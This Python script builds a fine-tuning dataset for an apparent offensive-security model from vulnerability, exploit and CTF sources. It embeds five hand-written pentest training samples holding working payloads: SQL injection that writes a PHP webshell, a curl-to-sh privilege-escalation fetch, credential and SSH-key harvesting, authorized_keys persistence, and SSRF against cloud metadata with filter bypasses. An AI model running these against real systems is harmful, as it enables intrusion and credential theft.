"""
build_master_dataset.py — сборка финального датасета для fine-tune
Объединяет все источники, фильтрует качество, строит train/val split
"""
import asyncio
import json
import random
import sys
from pathlib import Path
from datetime import datetime

sys.path.insert(0, str(Path(__file__).parent))

BASE = Path(__file__).parent.parent
RAW = BASE / "raw"
PROCESSED = BASE / "processed"

for d in [RAW, PROCESSED]:
    d.mkdir(parents=True, exist_ok=True)


# ── Loaders ──────────────────────────────────────────────────────────────────

def load_jsonl(path: Path) -> list:
    if not path.exists():
        return []
    with open(path) as f:
        return [json.loads(l) for l in f if l.strip()]


def load_json(path: Path) -> list:
    if not path.exists():
        return []
    with open(path) as f:
        data = json.load(f)
    return data if isinstance(data, list) else []


# ── Quality filter ────────────────────────────────────────────────────────────

MIN_OUTPUT_LEN = 150   # chars
MIN_INPUT_LEN = 20
MAX_OUTPUT_LEN = 4000

TEMPLATE_PHRASES = [
    "анализ требует изучения",
    "смотри полный контент",
    "специфичные для задачи",
    "определяется из контента",
    "стандартные python библиотеки",
]


def is_quality_sample(s: dict) -> bool:
    instruction = s.get("instruction", "")
    inp = s.get("input", "")
    output = s.get("output", "")

    if not instruction or not output:
        return False
    if len(output) < MIN_OUTPUT_LEN:
        return False
    if len(output) > MAX_OUTPUT_LEN:
        s["output"] = output[:MAX_OUTPUT_LEN]  # truncate, don't discard
    if len(inp) < MIN_INPUT_LEN and len(instruction) < 50:
        return False

    # Reject pure template outputs
    output_lower = output.lower()
    template_hits = sum(1 for p in TEMPLATE_PHRASES if p in output_lower)
    if template_hits >= 3:
        return False

    return True


def deduplicate(samples: list) -> list:
    """Remove near-duplicate samples by instruction+input hash."""
    seen = set()
    unique = []
    for s in samples:
        key = (s.get("instruction", "")[:80] + s.get("input", "")[:80]).strip()
        if key not in seen:
            seen.add(key)
            unique.append(s)
    return unique


# ── MITRE enrichment (inline, no import needed) ───────────────────────────────

def load_mitre_samples() -> list:
    """Load MITRE samples if already generated, else return empty."""
    return load_jsonl(PROCESSED / "mitre_samples.jsonl")


# ── Existing processed sources ────────────────────────────────────────────────

def load_all_processed() -> dict[str, list]:
    sources = {
        "nvd": load_jsonl(PROCESSED / "nvd_samples.jsonl"),
        "exploitdb": load_jsonl(PROCESSED / "exploitdb_samples.jsonl"),
        "ctf": load_jsonl(PROCESSED / "ctf_samples.jsonl"),
        "mitre": load_mitre_samples(),
        "github_vuln": load_jsonl(PROCESSED / "github_vuln_samples.jsonl"),
        "github_repo": load_jsonl(PROCESSED / "github_repo_samples.jsonl"),
    }

    # Also load old build_dataset.py output if exists
    old_dataset = PROCESSED / "hexor_full_dataset.jsonl"
    if old_dataset.exists():
        old = load_jsonl(old_dataset)
        # Only take samples with decent output length
        sources["legacy"] = [s for s in old if len(s.get("output", "")) >= MIN_OUTPUT_LEN]

    return sources


# ── Synthetic reasoning samples ───────────────────────────────────────────────

PENTEST_REASONING_SAMPLES = [
    {
        "instruction": "Ты проводишь black-box пентест веб-приложения. С чего начать и как выстроить методологию?",
        "input": "Target: https://target.example.com\nScope: только этот домен и поддомены\nTime: 5 дней",
        "output": """Black-box пентест методология (5 дней):

День 1 — Разведка (Reconnaissance):
- Passive: WHOIS, DNS enumeration (subfinder, amass), Shodan/Censys, Google dorks
- Active: nmap -sV -sC -p- (полное сканирование портов)
- Web fingerprinting: whatweb, wappalyzer, HTTP headers
- Directory bruteforce: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- SSL/TLS audit: testssl.sh target.example.com

День 2 — Маппинг поверхности атаки:
- Crawl приложения: spider все endpoints
- Анализ JavaScript: поиск API endpoints, секретов, логики
- Аутентификация: регистрация, логин, сброс пароля, 2FA
- Функционал: загрузка файлов, поиск, фильтры, экспорт

День 3-4 — Активное тестирование:
- Injection: SQLi (sqlmap), Command injection, XXE, SSTI
- XSS: reflected, stored, DOM-based
- Auth: brute force, bypass, session fixation, JWT issues
- IDOR: перебор ID в параметрах
- SSRF: внутренние адреса, cloud metadata (169.254.169.254)
- File upload: обход фильтров, webshell
- Business logic: race conditions, price manipulation

День 5 — Верификация и отчёт:
- Подтвердить все находки с PoC
- Построить attack chains
- Написать отчёт с severity, evidence, рекомендациями

Приоритет: сначала критические (RCE, SQLi, auth bypass), потом высокие.""",
        "source": "synthetic",
    },
    {
        "instruction": "Найден SQL injection в параметре id. Как максимально эксплуатировать его?",
        "input": "URL: https://target.com/user?id=1\nDBMS: MySQL (определён по error message)\nПользователь приложения: app_user",
        "output": """Эксплуатация SQL injection в MySQL:

# Шаг 1: Подтверждение и определение типа
# Error-based:
https://target.com/user?id=1'
# Boolean-based:
https://target.com/user?id=1 AND 1=1  (true)
https://target.com/user?id=1 AND 1=2  (false)

# Шаг 2: Определить количество столбцов
https://target.com/user?id=1 ORDER BY 1--
https://target.com/user?id=1 ORDER BY 2--
# Увеличивать до ошибки

# Шаг 3: UNION-based извлечение данных
https://target.com/user?id=-1 UNION SELECT 1,2,3--
# Найти отображаемые столбцы

# Шаг 4: Извлечь данные
-- Версия и пользователь:
UNION SELECT version(),user(),database()--

-- Список таблиц:
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

-- Столбцы таблицы users:
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- Дампить credentials:
UNION SELECT username,password,email FROM users--

# Шаг 5: Проверить FILE привилегии
UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

# Шаг 6: Запись файла (если FILE привилегия есть)
UNION SELECT '<?php system($_GET[cmd]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--

# Автоматизация через sqlmap:
sqlmap -u "https://target.com/user?id=1" --dbs --batch
sqlmap -u "https://target.com/user?id=1" -D target_db --tables
sqlmap -u "https://target.com/user?id=1" -D target_db -T users --dump
sqlmap -u "https://target.com/user?id=1" --os-shell  # если есть FILE привилегия

Evidence для отчёта: скриншот UNION SELECT с данными из БД.""",
        "source": "synthetic",
    },
    {
        "instruction": "Как провести разведку поддоменов и что делать с найденными?",
        "input": "Target: example.com\nЦель: найти максимальную поверхность атаки",
        "output": """Subdomain enumeration и дальнейшие шаги:

# Пассивная разведка (без запросов к цели):
subfinder -d example.com -o subs_passive.txt
amass enum -passive -d example.com -o subs_amass.txt
# Certificate transparency:
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u

# Активная разведка:
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
# Или:
ffuf -w wordlist.txt -u https://FUZZ.example.com -mc 200,301,302,403

# Объединить и дедуплицировать:
cat subs_*.txt | sort -u > all_subs.txt

# Проверить живые хосты:
httpx -l all_subs.txt -o live_subs.txt -status-code -title -tech-detect

# Что делать с найденными поддоменами:
1. Subdomain takeover: проверить CNAME на несуществующие сервисы
   subjack -w all_subs.txt -t 100 -o takeover.txt

2. Старые/забытые сервисы: часто меньше защищены
   - dev.*, staging.*, test.*, old.*, beta.*

3. API endpoints: api.*, api-v2.*, internal-api.*
   - Часто без WAF, с debug режимом

4. Admin панели: admin.*, dashboard.*, manage.*
   - Проверить default credentials

5. Каждый живой поддомен — отдельная цель для полного тестирования""",
        "source": "synthetic",
    },
    {
        "instruction": "Получен shell на сервере Linux. Опиши post-exploitation методологию.",
        "input": "Shell: www-data@target (непривилегированный)\nОС: Ubuntu 20.04\nЦель: максимальный impact",
        "output": """Post-exploitation на Linux (www-data → root):

# Шаг 1: Разведка системы
id && whoami
uname -a && cat /etc/os-release
hostname && ip addr
cat /etc/passwd | grep -v nologin
ps aux | grep -v '\[' | head -30

# Шаг 2: Поиск путей для privesc
# Автоматически:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Вручную:
# SUID бинари:
find / -perm -4000 -type f 2>/dev/null

# Sudo права:
sudo -l

# Cron jobs:
cat /etc/crontab && ls -la /etc/cron.*

# Writable файлы в PATH:
find /usr/local/bin /usr/bin -writable 2>/dev/null

# Kernel exploits:
uname -r  # проверить версию ядра против известных LPE

# Шаг 3: Сбор данных (горизонтальное движение)
# Конфиги с credentials:
find /var/www -name "*.php" -o -name "*.env" -o -name "config.*" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null

# БД credentials:
cat /var/www/*/wp-config.php 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# SSH ключи:
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Шаг 4: Persistence (если нужно для демонстрации)
# Добавить SSH ключ (обратимо):
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Шаг 5: Документирование
# Скриншот id=0(root) после privesc — главный evidence""",
        "source": "synthetic",
    },
    {
        "instruction": "Как обнаружить и эксплуатировать SSRF уязвимость?",
        "input": "Приложение: веб-сервис с функцией загрузки изображений по URL\nПараметр: ?url=https://example.com/image.jpg",
        "output": """SSRF — обнаружение и эксплуатация:

# Шаг 1: Подтверждение SSRF
# Использовать Burp Collaborator или interactsh:
?url=https://your-collaborator.burpcollaborator.net/test
# Если получили DNS/HTTP запрос — SSRF подтверждён

# Шаг 2: Определить тип SSRF
# Blind SSRF: ответ не виден, только side-effects
# Semi-blind: видим статус код или размер ответа
# Full SSRF: видим полный ответ

# Шаг 3: Внутренняя сеть
# Cloud metadata (критично!):
?url=http://169.254.169.254/latest/meta-data/  # AWS
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://metadata.google.internal/computeMetadata/v1/  # GCP
?url=http://169.254.169.254/metadata/instance  # Azure

# Внутренние сервисы:
?url=http://localhost:8080/admin
?url=http://127.0.0.1:6379/  # Redis
?url=http://internal-service:5432/  # PostgreSQL
?url=http://10.0.0.1/  # внутренняя сеть

# Шаг 4: Bypass фильтров
# Если блокируют 127.0.0.1:
?url=http://127.1/
?url=http://0x7f000001/
?url=http://2130706433/  # decimal IP
?url=http://localhost.attacker.com/  # DNS rebinding

# Шаг 5: Протоколы (если не только HTTP)
?url=file:///etc/passwd
?url=dict://localhost:6379/info  # Redis commands
?url=gopher://localhost:6379/_*1%0d%0a...  # Redis RCE

# Impact:
- AWS credentials → полный доступ к облаку
- Internal services → lateral movement
- file:// → LFI
- Redis/Memcached → RCE через gopher://""",
        "source": "synthetic",
    },
]


# ── Main builder ──────────────────────────────────────────────────────────────

class MasterDatasetBuilder:
    def __init__(self):
        self.stats: dict = {}

    def build(self) -> list:
        print("=" * 60)
        print("HEXOR MASTER DATASET BUILDER v2")
        print("=" * 60)

        # Load all sources
        sources = load_all_processed()

        all_samples = []

        for source_name, samples in sources.items():
            before = len(samples)
            filtered = [s for s in samples if is_quality_sample(s)]
            self.stats[source_name] = {"raw": before, "filtered": len(filtered)}
            print(f"  {source_name}: {before} raw → {len(filtered)} quality")
            all_samples.extend(filtered)

        # Add synthetic reasoning samples
        all_samples.extend(PENTEST_REASONING_SAMPLES)
        self.stats["synthetic"] = {"raw": len(PENTEST_REASONING_SAMPLES), "filtered": len(PENTEST_REASONING_SAMPLES)}
        print(f"  synthetic: {len(PENTEST_REASONING_SAMPLES)} samples")

        # Deduplicate
        before_dedup = len(all_samples)
        all_samples = deduplicate(all_samples)
        print(f"\n  Deduplication: {before_dedup} → {len(all_samples)}")

        # Shuffle
        random.seed(42)
        random.shuffle(all_samples)

        self.stats["total"] = len(all_samples)
        return all_samples

    def save(self, samples: list):
        ts = datetime.now().strftime("%Y%m%d_%H%M")

        # Train/val split 90/10
        split = int(len(samples) * 0.9)
        train = samples[:split]
        val = samples[split:]

        # Save full dataset
        with open(PROCESSED / f"hexor_dataset_{ts}.jsonl", "w") as f:
            for s in samples:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        # Save train/val
        with open(PROCESSED / "train.jsonl", "w") as f:
            for s in train:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        with open(PROCESSED / "val.jsonl", "w") as f:
            for s in val:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        # Save Alpaca format (for most fine-tune frameworks)
        alpaca = [
            {
                "instruction": s.get("instruction", ""),
                "input": s.get("input", ""),
                "output": s.get("output", ""),
            }
            for s in samples
        ]
        with open(PROCESSED / "train_alpaca.json", "w") as f:
            json.dump(alpaca[:split], f, ensure_ascii=False, indent=2)

        # Stats
        self.stats.update({
            "train": len(train),
            "val": len(val),
            "built_at": datetime.now().isoformat(),
        })
        with open(PROCESSED / f"stats_{ts}.json", "w") as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)

        print(f"\n{'='*60}")
        print("DATASET READY")
        print(f"{'='*60}")
        print(f"Total:  {len(samples)}")
        print(f"Train:  {len(train)}")
        print(f"Val:    {len(val)}")
        print(f"\nFiles:")
        print(f"  processed/train.jsonl          ← для fine-tune")
        print(f"  processed/val.jsonl            ← для evaluation")
        print(f"  processed/train_alpaca.json    ← Alpaca format")
        print(f"  processed/hexor_dataset_{ts}.jsonl")
        print(f"\nSource breakdown:")
        for src, stat in self.stats.items():
            if isinstance(stat, dict) and "filtered" in stat:
                print(f"  {src}: {stat['filtered']}")


async def main():
    # Optionally run fetchers first if data is missing
    missing = []
    if not (PROCESSED / "nvd_samples.jsonl").exists():
        missing.append("fetch_nvd.py")
    if not (PROCESSED / "exploitdb_samples.jsonl").exists():
        missing.append("fetch_exploitdb.py")
    if not (PROCESSED / "ctf_samples.jsonl").exists():
        missing.append("fetch_ctf.py")
    if not (PROCESSED / "mitre_samples.jsonl").exists():
        missing.append("fetch_mitre.py")

    if missing:
        print(f"⚠ Missing processed data from: {', '.join(missing)}")
        print("Run these scripts first, or continue with available data.\n")

    builder = MasterDatasetBuilder()
    samples = builder.build()

    if not samples:
        print("\n✗ No samples found. Run fetch_*.py scripts first.")
        return

    builder.save(samples)


if __name__ == "__main__":
    asyncio.run(main())
